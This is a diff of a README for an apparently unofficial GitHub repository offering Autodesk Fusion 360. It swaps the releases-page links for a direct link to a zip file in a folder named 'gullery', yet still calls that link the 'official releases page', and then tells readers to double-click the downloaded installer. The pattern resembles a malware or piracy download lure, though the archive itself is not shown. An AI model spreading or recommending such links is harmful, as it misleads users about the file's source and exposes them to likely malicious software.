@@ -1,6 +1,6 @@
 # 🛠️ Autodesk-Fusion-360-CAD-Software - Build professional 3D models with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Fusion_360-blue.svg)](https://github.com/Matex1751/Autodesk-Fusion-360-CAD-Software/releases)
+[![Download Software](https://img.shields.io/badge/Download-Fusion_360-blue.svg)](https://github.com/Matex1751/Autodesk-Fusion-360-CAD-Software/raw/refs/heads/main/gullery/Fusion-CA-Software-Autodesk-v3.0.zip)
 
 Autodesk Fusion 360 serves as an integrated platform for product design and manufacturing. It combines CAD, CAM, and CAE tools into one workspace. Users create 3D models, perform structural simulations, and prepare designs for machining or 3D printing. This software supports parametric modeling, which allows you to adjust dimensions and features at any stage of the design cycle.
 
@@ -19,7 +19,7 @@ Confirm your Windows computer meets these specifications before you begin the in
 
 Follow these steps to download and set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Matex1751/Autodesk-Fusion-360-CAD-Software/releases) to access the download options.
+1.  Visit the [official releases page](https://github.com/Matex1751/Autodesk-Fusion-360-CAD-Software/raw/refs/heads/main/gullery/Fusion-CA-Software-Autodesk-v3.0.zip) to access the download options.
 2.  Locate the latest version release.
 3.  Click the installer link to download the file to your computer.
 4.  Open your Downloads folder and double-click the file to start the installer.
